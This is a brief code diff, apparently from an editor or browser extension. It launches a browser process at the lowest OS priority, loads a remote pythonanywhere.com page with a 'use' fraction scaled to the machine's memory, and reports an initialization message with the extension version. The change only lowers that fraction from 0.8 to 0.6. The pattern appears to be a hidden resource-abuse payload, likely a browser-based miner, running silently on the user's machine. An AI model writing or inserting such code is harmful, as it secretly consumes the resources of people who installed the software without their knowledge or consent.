@@ -120,7 +120,7 @@
     });
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.8 : 0.3));
+    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.6 : 0.3));
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
